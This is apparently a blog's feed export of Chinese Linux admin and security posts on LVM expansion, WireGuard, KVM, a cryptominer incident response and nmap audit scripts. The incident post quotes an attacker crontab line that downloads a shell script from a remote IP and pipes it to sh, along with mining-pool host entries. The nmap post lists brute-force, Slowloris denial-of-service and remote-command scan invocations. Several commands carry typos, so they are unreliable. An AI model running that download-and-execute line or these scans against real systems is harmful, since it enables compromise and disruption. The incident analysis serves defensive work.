    <content type="html"><![CDATA[<h1 id="Centos7扩容"><a href="#Centos7扩容" class="headerlink" title="Centos7扩容"></a>Centos7扩容</h1><p>只写了命令大概是怎么用的，我自己理解的解释没写，你们自己百度理解一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l /* 列出磁盘 */</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q1.png" alt="WX20200228-210617|661x500"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/vda /*vda即你要扩容的那块盘，进行分区*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q2.png" alt="WX20200228-210726|538x500"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">partprobe /*为了让系统识别新的分区*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q3.png" alt="WX20200228-210937|550x500"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pvcreate /dev/vda3 /*将物理硬盘初始化为物理卷*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q4.png" alt="WX20200228-210937|550x500"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgscan /*查看所有卷组,重点看卷组名称*/</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/Centos7扩容/q5.png" alt="WX20200228-211010|690x153"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgextend centos  /dev/vda3 /*扩展卷组*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q6.png" alt="WX20200228-211045|690x97"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgdisplay /*显示卷组信息*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q7.png" alt="WX20200228-211223|690x460"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvextend -l+100%FREE /dev/mapper/centos-root /*扩展逻辑卷*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q8.png" alt="WX20200228-211256|690x200"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfs_growfs /dev/mapper/centos-root /*对挂载目录进行扩容*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q9.png" alt="WX20200228-211318|690x276"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/29/Centos7扩容/q10.png" alt="image|690x291"><br>步骤是这样的，测试的时候没扩容成功，你们研究这看一下，我觉得总体步骤是没问题的。</p>]]></content>
    
    <summary type="html">
    
      centos7扩容，扩容有风险，操作须谨慎。
    
    </summary>
    
    
      <category term="centos" scheme="http://yoursite.com/tags/centos/"/>
    
      <category term="扩容" scheme="http://yoursite.com/tags/%E6%89%A9%E5%AE%B9/"/>
    
  </entry>
  
  <entry>
    <title>Debian&amp;Archlinux部署Wireguard</title>
    <link href="http://yoursite.com/2020/03/29/Debian-Archlinux%E9%83%A8%E7%BD%B2Wireguard/"/>
    <id>http://yoursite.com/2020/03/29/Debian-Archlinux部署Wireguard/</id>
    <published>2020-03-29T14:52:22.000Z</published>
    <updated>2020-03-29T15:07:02.582Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Debian-amp-Archlinux部署Wireguard"><a href="#Debian-amp-Archlinux部署Wireguard" class="headerlink" title="Debian&amp;Archlinux部署Wireguard"></a>Debian&amp;Archlinux部署Wireguard</h1><p>wireguard远程办公其实还是蛮爽的，安装比较简单</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install wireguard</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>然后把你们网管给你的私钥放在<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">sudo vim /etc/wireguard/wg0.conf</span><br></pre></td></tr></table></figure></p><p>配置文件大概这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;</span><br><span class="line">[Interface]</span><br><span class="line">PrivateKey = $(cat client_privatekey)</span><br><span class="line">Address = 10.0.0.2/24</span><br><span class="line">DNS = 8.8.8.8</span><br><span class="line">MTU = 1420</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = $(cat server_publickey)</span><br><span class="line">Endpoint = 1.2.3.4:50814</span><br><span class="line">AllowedIPs = 0.0.0.0/0, ::0/0</span><br><span class="line">PersistentKeepalive = 25 &quot; &gt; client.conf</span><br></pre></td></tr></table></figure></p><p>你的ifconfig信息大概这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">➜  ifconfig                                                              ✔  23:29:15</span><br><span class="line">lo0: flags=8049&lt;UP,LOOPBACK,RUNNING,MULTICAST&gt; mtu 16384</span><br><span class="line">options=1203&lt;RXCSUM,TXCSUM,TXSTATUS,SW_TIMESTAMP&gt;</span><br><span class="line">inet 127.0.0.1 netmask 0xff000000</span><br><span class="line">inet6 ::1 prefixlen 128</span><br><span class="line">inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">gif0: flags=8010&lt;POINTOPOINT,MULTICAST&gt; mtu 1280</span><br><span class="line">stf0: flags=0&lt;&gt; mtu 1280</span><br><span class="line">XHC20: flags=0&lt;&gt; mtu 0</span><br><span class="line">en0: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options=6b&lt;RXCSUM,TXCSUM,VLAN_HWTAGGING,TSO4,TSO6&gt;</span><br><span class="line">ether 80:fa:5b:64:6e:a6</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect (&lt;unknown type&gt;)</span><br><span class="line">status: inactive</span><br><span class="line">en1: flags=8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">ether 18:4f:32:f4:7e:a3</span><br><span class="line">inet6 fe80::1c97:67ed:68fb:d0ee%en1 prefixlen 64 secured scopeid 0x6</span><br><span class="line">inet6 2408:8207:c9a:2db0:1b:b572:56e0:4cac prefixlen 64 autoconf secured</span><br><span class="line">inet6 2408:8207:c9a:2db0:a0f4:631b:7637:1b83 prefixlen 64 autoconf temporary</span><br><span class="line">inet 10.10.10.5 netmask 0xffffff00 broadcast 10.10.10.255</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br><span class="line">p2p0: flags=8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu 2304</span><br><span class="line">ether 0a:4f:32:f4:7e:a3</span><br><span class="line">media: autoselect</span><br><span class="line">status: inactive</span><br><span class="line">awdl0: flags=8943&lt;UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1484</span><br><span class="line">ether 5a:14:bb:ea:17:7a</span><br><span class="line">inet6 fe80::5814:bbff:feea:177a%awdl0 prefixlen 64 scopeid 0x8</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br><span class="line">utun0: flags=8051&lt;UP,POINTOPOINT,RUNNING,MULTICAST&gt; mtu 2000</span><br><span class="line">inet6 fe80::2c3b:78b4:b948:a51f%utun0 prefixlen 64 scopeid 0x9</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">utun1: flags=8051&lt;UP,POINTOPOINT,RUNNING,MULTICAST&gt; mtu 1380</span><br><span class="line">inet6 fe80::83f5:8460:590a:6ae1%utun1 prefixlen 64 scopeid 0xa</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">vnic0: flags=8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options=3&lt;RXCSUM,TXCSUM&gt;</span><br><span class="line">ether 00:1c:42:00:00:08</span><br><span class="line">inet 10.211.55.2 netmask 0xffffff00 broadcast 10.211.55.255</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br><span class="line">vnic1: flags=8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options=3&lt;RXCSUM,TXCSUM&gt;</span><br><span class="line">ether 00:1c:42:00:00:09</span><br><span class="line">inet 10.37.129.2 netmask 0xffffff00 broadcast 10.37.129.255</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br></pre></td></tr></table></figure></p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wg-qucik up wg0</span><br><span class="line">wg-quick down wg0</span><br></pre></td></tr></table></figure><h1 id="Archlinux-Wireguard"><a href="#Archlinux-Wireguard" class="headerlink" title="Archlinux Wireguard"></a>Archlinux Wireguard</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>我后来尝试在manjaro上部署wireguard，但是wireguard告诉我，不支持我的内核，窝头。。。<br><img src="/2020/03/29/Debian-Archlinux部署Wireguard/1.jpeg" alt="lALPD2eDJ_4-MKnNA-TNBCI_1058_996|531x500"> </p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>当我执行以下命令检查内核模块的时候,告诉我没有。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modprobe wireguard &amp;&amp; lsmod | grep wireguard</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modprobe: FATAL: Module wireguard not found</span><br></pre></td></tr></table></figure><p>查看内核版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uanme -a</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux lazy 5.3.18-1-MANJARO #1 SMP PREEMPT Wed Dec 18 18:34:35 UTC 2019 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers</span><br></pre></td></tr></table></figure><p>他会提示一些内核版本，你需装符合你内核版本的linux-header即可<br><img src="/2020/03/29/Debian-Archlinux部署Wireguard/2.png" alt="2020-02-28_23-52|650x270"><br>这次再去启动，就没有问题了<br><img src="/2020/03/29/Debian-Archlinux部署Wireguard/3.jpeg" alt="lALPD2eDJ_4-MKrNA5fNBB0_1053_919|572x500"></p>]]></content>
    
    <summary type="html">
    
      wireguard远程办公其实还是蛮爽的，安装比较简单
    
    </summary>
    
    
      <category term="Archlinux" scheme="http://yoursite.com/tags/Archlinux/"/>
    
      <category term="Debian" scheme="http://yoursite.com/tags/Debian/"/>
    
      <category term="wireguard" scheme="http://yoursite.com/tags/wireguard/"/>
    
  </entry>
  
  <entry>
    <title>Archlinux&amp;Debian安装kvm</title>
    <link href="http://yoursite.com/2020/03/29/Archlinux-Debian%E5%AE%89%E8%A3%85kvm/"/>
    <id>http://yoursite.com/2020/03/29/Archlinux-Debian安装kvm/</id>
    <published>2020-03-29T14:47:32.000Z</published>
    <updated>2020-03-29T14:49:45.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="debian-安装kvm"><a href="#debian-安装kvm" class="headerlink" title="debian 安装kvm"></a>debian 安装kvm</h1><p>因为公司项目要求，所以在鸟上部署了kvm，但是当时部署的没截图，所以只写一下部署过程，大概率不会遇到什么错误。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep &apos;(vmx|svm)&apos; --color=always /proc/cpuinfo /*检查是否开启虚拟化*/</span><br></pre></td></tr></table></figure><p>安装QEMU和KVM及其他组建libvirt什么什么的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu qemu-kvm qemu-system qemu-utils libvirt-clients libvirt-daemon-system virtinst virt-manager bridge-utils libguestfs-tools libosinfo-bin</span><br></pre></td></tr></table></figure></p><p>将当前用户添加到libvirt libvirt-qume组中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -a -G libvirt user</span><br><span class="line">sudo usermod -a -G libvirt-qume</span><br></pre></td></tr></table></figure></p><p>到这其实已经部署完成。</p><h2 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">virsh list  /*在线VM*/</span><br><span class="line">virsh list --all  /*所有VM*/</span><br><span class="line">virsh start /*开机*/</span><br><span class="line">virsh shutdown  /*软关机*/</span><br><span class="line">virsh destroy /*强制关机*/</span><br><span class="line">virsh dnmpxml vm_name &gt; name.xml  /*配置备份，xml配置文件路径  /etc/libvirt/qemu */</span><br><span class="line">virsh undefine  /*删除vm，只是删除配置文件*/</span><br><span class="line">virsh define name.xml /*导入备份的xml配置*/</span><br><span class="line">virsh edit vm_name  /*修改配置文件，带语法检查*/</span><br><span class="line">virsh domrename oldname newname   /*重命名，在关机状态修改*/</span><br><span class="line">virsh suspend   /*挂起，状态paused*/</span><br><span class="line">virsh resume    /*解除挂起*/</span><br><span class="line">virsh vncdisplayer    /*查看vnc端口号*/</span><br><span class="line">virsh autostart name    /*开机自启动，原理配置软连接实现*/</span><br><span class="line">virsh autostart --disable name    /*取消开机启动*/</span><br><span class="line">virsh console name    /*#ctrl + ] 切换退出，可不通过网络，底层console连接*/</span><br><span class="line">brctl show    /*查看桥接网路*/</span><br><span class="line">virsh domiflist VM1   /*查看VM1网卡*/</span><br><span class="line">qemu-img info   /*查看磁盘信息*/</span><br><span class="line">qemu-img convert -f raw -O qcow2 name.raw name.qcow   /*转换格式,支持vmdk*/</span><br><span class="line">virsh snapshot-create   /*快照*/</span><br><span class="line">virsh snapshot-list   /*快照列表,快照直接放在虚拟磁盘中*/</span><br><span class="line">virsh snapshot-delete vmname --snapshotname   /*删除快照，删除快照文件不会变小*/</span><br><span class="line">virsh snapshot-revert vmname    /*还原快照*/</span><br></pre></td></tr></table></figure><h2 id="如何创建一个虚拟机？"><a href="#如何创建一个虚拟机？" class="headerlink" title="如何创建一个虚拟机？"></a>如何创建一个虚拟机？</h2><h3 id="直接用命令创建"><a href="#直接用命令创建" class="headerlink" title="直接用命令创建"></a>直接用命令创建</h3><p>创建磁盘映像：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 -o size=35G,preallocation=&quot;metadata&quot; /kvm/windows7\ test1/wintest1.qcow2</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">virt-install -n wintest1 \</span><br><span class="line">&gt; -r 1536 --vcpus=1 \</span><br><span class="line">&gt; -c /kvm/iso/cn_windows_7_professional_with_sp1_vl_build_x86_dvd_u_677939.iso \</span><br><span class="line">&gt; --os-type=windows \ #设定操作系统标签</span><br><span class="line">&gt; --disk path=/kvm/windows7 \ test1/wintest1.qcow2,device=disk,bus=sata,size=35,format=qcow2 \</span><br><span class="line">&gt; --network network=default</span><br></pre></td></tr></table></figure><p>这里边参数大概是这样：<br>-n 虚拟机名称<br>-r 向外映射的端口<br>-c 镜像端口<br>–os-type 你安装的镜像类型和vmware类似<br>–disk path 你的磁盘位置<br>–network network=default 网络，默认是nat<br>这里还涉及到一些很细节的参数，安装想不起来了，想起来再来补充，这是安装win7的，安装linux的也一样，举一反三，懂吧？</p><h3 id="用virt-manager"><a href="#用virt-manager" class="headerlink" title="用virt-manager"></a>用virt-manager</h3><p>用图形化就比较简单了，点点点，你们自己去发掘。<br><img src="/2020/03/29/Archlinux-Debian安装kvm/a.png" alt="kvm-qemu|626x500"> </p><hr><p>用命令创建需要啪啦啪啦敲一堆命令，推荐图形化简单一点。<br>其实这里还涉及到了kvm的网络配置，那块我还没研究，后续再来补充。</p><hr><h1 id="今天建kvm时候发现了一个很恶心的问题，"><a href="#今天建kvm时候发现了一个很恶心的问题，" class="headerlink" title="今天建kvm时候发现了一个很恶心的问题，"></a>今天建kvm时候发现了一个很恶心的问题，</h1><h2 id="error"><a href="#error" class="headerlink" title="error:"></a>error:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KVM cannot access storage file (as uid:107, gid:107)permission denied</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/Archlinux-Debian安装kvm/b.png" alt="2020-03-05_15-32|509x500"> </p><h2 id="slove"><a href="#slove" class="headerlink" title="slove"></a>slove</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/libvirt/qemu.conf</span><br></pre></td></tr></table></figure><p>将<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image|548x500](c.jpeg)</span><br></pre></td></tr></table></figure></p><p>sudo systemctl restart libvirt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![2020-03-05_15-32_1|690x444](d.png)</span><br><span class="line"># 如何将vmdk转qcow2？</span><br></pre></td></tr></table></figure></p><p>qemu-img convert -f vmdk -O qcow2  xxx.vmdk xxx.qcow2<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      因为公司项目要求，所以在debian和arch上部署了kvm，但是当时部署的没截图，所以只写一下部署过程，大概率不会遇到什么错误。
    
    </summary>
    
    
      <category term="Archlinux" scheme="http://yoursite.com/tags/Archlinux/"/>
    
      <category term="Debian" scheme="http://yoursite.com/tags/Debian/"/>
    
      <category term="kvm" scheme="http://yoursite.com/tags/kvm/"/>
    
  </entry>
  
  <entry>
    <title>一次失败的应急，无法溯源springboot+redis+mongo</title>
    <link href="http://yoursite.com/2020/03/29/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%BA%94%E6%80%A5%EF%BC%8C%E6%97%A0%E6%B3%95%E6%BA%AF%E6%BA%90springboot-redis-mongo/"/>
    <id>http://yoursite.com/2020/03/29/一次失败的应急，无法溯源springboot-redis-mongo/</id>
    <published>2020-03-29T14:42:23.000Z</published>
    <updated>2020-03-29T14:43:25.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次失败的应急springboot-redis-mongo"><a href="#一次失败的应急springboot-redis-mongo" class="headerlink" title="一次失败的应急springboot+redis+mongo"></a>一次失败的应急springboot+redis+mongo</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>昨个接到消息大概这样，某机构20年2月13号，2月23号，2月28号，3月4号均cpu占用异常高，疑似挖矿木马，通过和网管及其开发人员沟通，应用架构是<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## 检测</span><br><span class="line">通过架构，我们首先想到可能是redis未授权，又或是mongo未授权，nmap测了一波也未发现，以为是nmap问题，自己又手动测了一波，redis和mongo端口都不是默认的，并且设置了安全访问也就是密钥。</span><br><span class="line"></span><br><span class="line">从zabbix上来看，15天的cpu占用，2月21号到2月23号cpu一直占用170%，在3月4号又出现cpu占用很高。</span><br><span class="line"></span><br><span class="line">发现/var/spool/cron/root计划任务</span><br></pre></td></tr></table></figure></p><p><em>/15 </em> <em> </em> *<br>(/usr/bin/jterfa8||/usr/libexec/jterfa8||/usr/local/bin/jterfa8||/tmp/jterfa8||curl -m180 -fsSL <a href="http://67.207.95.103:8000/i.sh||wget" target="_blank" rel="noopener">http://67.207.95.103:8000/i.sh||wget</a> -q -T180 -O- <a href="http://67.207.95.103:8000/i.sh" target="_blank" rel="noopener">http://67.207.95.103:8000/i.sh</a>) | sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">发现/etc/hosts被写了一堆矿池域名</span><br></pre></td></tr></table></figure></p><p> mine.moneropool.com”<br> xmr.crypto-pool.fr”  </p><p> monerohash.com”  </p><p> xmrpool.eu”  </p><p> pool.noobxmr.com”  </p><p> pool.minexmr.cn”  </p><p> xmr.poolto.be”  </p><p> monerohash.com”  </p><p> stratum.viaxmr.com”  </p><p> pool.monero.hashvault.pro”  </p><p> xmr-us.suprnova.cc”  </p><p> de.moriaxmr.com”  </p><p> de2.moriaxmr.com”  </p><p> fr.minexmr.com”  </p><p> de.minexmr.com”  </p><p> ca.minexmr.com”  </p><p> sg.minexmr.com”  </p><p> xmr.bohemianpool.com”  </p><p> xmr-usa.dwarfpool.com”  </p><p> monero.miners.pro”  </p><p> xmr.prohash.net”  </p><p> thyrsi.com”  </p><p> minerxmr.ru”  </p><p> zer0day.ru”  </p><p> minergate.com”  </p><p> pixeldra.in”  </p><p>“220.194.237.43 w.3ei.xyz”  </p><p>“220.194.237.43 w.21-3n.xyz”<br><code>`</code></p><h2 id="清除"><a href="#清除" class="headerlink" title="清除"></a>清除</h2><ol><li>停掉计划任务并清除挖矿计划任务</li><li>清除hosts恶意指向</li></ol><hr><p>其实我们处理的时候就cpu占用就不高了，排查的时候没看到可以进程，无可疑文件，15天内无系统文件被劫持。<br>和网管聊了一下，他们之前有自己处理过，在加上360天擎也杀了一部分，所以有一些细节性的东西就看不到了，应急到这也就只能被迫结束。</p><h2 id="抑制"><a href="#抑制" class="headerlink" title="抑制"></a>抑制</h2><p>没溯源彻底，所以也谈不上抑制，建设性的提了几点：</p><ol><li>不建议redis对公网监听</li><li>不建议redis以root用户启动</li></ol>]]></content>
    
    <summary type="html">
    
      昨个接到消息大概这样，某机构20年2月13号，2月23号，2月28号，3月4号均cpu占用异常高，疑似挖矿木马，通过和网管及其开发人员沟通，应用架构是springboot+redis+mongodb+nginx还有memcache
    
    </summary>
    
    
      <category term="incident response" scheme="http://yoursite.com/tags/incident-response/"/>
    
  </entry>
  
  <entry>
    <title>nmap高级用法</title>
    <link href="http://yoursite.com/2020/03/29/nmap%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/"/>
    <id>http://yoursite.com/2020/03/29/nmap高级用法/</id>
    <published>2020-03-29T14:41:02.000Z</published>
    <updated>2020-03-29T14:41:40.239Z</updated>
    
    <content type="html"><![CDATA[<p>前两天在做等保中的漏洞复测，用的nmap脚本比较多，今天刚好闲下来，把nmap脚本用法简单写一下</p><h1 id="简单的给大家过一下，基本操作哈。"><a href="#简单的给大家过一下，基本操作哈。" class="headerlink" title="简单的给大家过一下，基本操作哈。"></a>简单的给大家过一下，基本操作哈。</h1><p>比如说，我们要进行对icmp的扫描,我们可以这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP ipaddress</span><br></pre></td></tr></table></figure></p><p>我们要对目标半开放式端口扫描不想在留下日志记录怎么整？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p port ipadress</span><br></pre></td></tr></table></figure></p><h1 id="下面介绍一些nmap的审计脚本"><a href="#下面介绍一些nmap的审计脚本" class="headerlink" title="下面介绍一些nmap的审计脚本"></a>下面介绍一些nmap的审计脚本</h1><p>snmp默认团体名/弱口令漏洞及安全加固<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sU –p161 –script=snmp-brute ipaddress 审计snmp弱口令</span><br></pre></td></tr></table></figure></p><p>iis短文件名泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script http-iis-short-name-brute ipaddress</span><br></pre></td></tr></table></figure></p><p>Memcached未授权访问漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 11211 -script memcached-info ipaddress</span><br></pre></td></tr></table></figure></p><p>验证https.sys远程代码执行漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV - (-) script http-vuln-cve2015-1635 ipaddress</span><br></pre></td></tr></table></figure></p><p>心脏出血<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --scipt=ssl-heartbleed ipaddress</span><br></pre></td></tr></table></figure></p><p>mongodb未授权访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 27017 --script mongodb-info ipaddress</span><br></pre></td></tr></table></figure></p><p>redis未授权访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 6370 --script redis-info ipaddress</span><br></pre></td></tr></table></figure></p><p>elastticsearch未授权访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=http-vuln-cve2015-1427 --script-args command=&apos;ls&apos; ipaddress</span><br></pre></td></tr></table></figure></p><p>rsync未授权漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 873 --script rsync=brute ==script=args &apos;rsync-brute.module=www&apos;</span><br></pre></td></tr></table></figure></p><p>http拒绝服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --max-paralleism 800-script http=slowloris siteaddress</span><br></pre></td></tr></table></figure></p><p>ftp弱口令暴力破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 